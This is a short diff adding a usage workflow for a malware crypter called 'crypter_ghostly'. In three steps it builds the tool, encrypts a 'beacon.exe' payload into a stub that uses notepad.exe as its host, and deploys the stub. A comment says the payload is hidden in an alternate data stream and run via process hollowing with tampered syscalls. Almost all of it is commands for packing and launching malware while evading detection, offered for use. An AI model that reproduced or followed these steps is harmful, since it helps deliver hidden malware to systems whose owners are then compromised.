@@ -1,0 +1,10 @@
+🚀 USAGE WORKFLOW
+Step 1: Build the crypter system
+batch
+build.cmd
+Step 2: Encrypt payload and generate stub
+batch
+crypter_ghostly.exe beacon.exe stub_template.exe C:\Windows\System32\notepad.exe
+Step 3: Deploy and execute stub
+batch
+ghostly_beacon.exe  # Payload hidden in ADS, decrypted with XMM key, executed via Ghostly Hollowing with tampered syscalls
